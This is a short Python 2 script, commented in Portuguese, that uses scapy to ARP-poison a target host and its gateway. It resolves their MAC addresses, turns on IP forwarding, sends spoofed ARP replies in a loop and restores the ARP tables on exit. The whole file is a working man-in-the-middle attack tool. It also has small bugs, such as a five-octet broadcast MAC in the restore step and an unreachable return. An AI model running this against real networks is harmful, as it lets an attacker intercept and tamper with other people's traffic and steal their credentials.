from scapy.all import *
from utils import *
import os
import sys
import threading
import signal



def restore_target(gateway,gateway_mac,target,target_mac):
	print "[*] Restaurando alvo..."
	send(ARP(op=2, psrc=gateway, pdst=target, hwdst="ff:ff:ff:ff:ff", hwsrc=gateway_mac),count=5)
	send(ARP(op=2, psrc=target, pdst=gateway, hwdst="ff:ff:ff:ff:ff",hwsrc=target_mac),count=5)
	set_ip_forwarding(0)

def get_mac(ip_address):
	responses,unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_address), timeout=2,retry=10)

	 # Retorna o endereco MAC de uma resposta

	for s,r in responses:
		return r[Ether].src
		return None

def poison_target(gateway,gateway_mac,target,target_mac):
	iptables()
	set_ip_forwarding(1)	
	poison_target = ARP()
	poison_target.op = 2
	poison_target.psrc = gateway
	poison_target.pdst = target
	poison_target.hwdst = target_mac
	poison_gateway = ARP()
	poison_gateway.op = 2
	poison_gateway.psrc = target
	poison_gateway.pdst = gateway
	poison_gateway.hwdst = gateway_mac

	print "[*] Iniciando o evenenamento ARP. [Ctrl-C para finalizar]"

	try:
		while True:
			send(poison_target)
			send(poison_gateway)
			time.sleep(5)
	except KeyboardInterrupt:
		restore_target(gateway,gateway_mac,target,target_mac)
		print "[*] Evenenamento ARP finalizado."
		return

